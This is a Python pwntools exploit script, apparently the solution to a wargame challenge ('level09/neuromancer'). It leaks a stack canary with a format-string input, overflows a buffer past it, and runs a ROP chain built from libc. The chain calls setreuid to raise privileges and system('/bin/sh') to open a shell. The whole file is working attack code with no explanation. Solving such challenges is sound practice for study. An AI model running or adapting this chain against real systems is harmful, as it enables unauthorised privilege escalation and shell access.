import sys
from pwn import *

context.arch = 'amd64'
io = process("/home/level09/neuromancer")

io.recvuntil(b"Session tag: ")
io.sendline(b"%15$p")
io.recvuntil(b"Tag accepted: ")
stack_canary = io.recvline().decode().strip()[2:]

print(stack_canary)

io.recvuntil(b"Authentication token: ")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000
rop = ROP(libc, badchars=b"\n")
rop.setreuid(1026, 1026)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

payload = b"A" * 72
payload += p64(int(stack_canary, 16))
payload += b"A" * 8
payload += rop.chain()


io.sendline(payload)

io.interactive()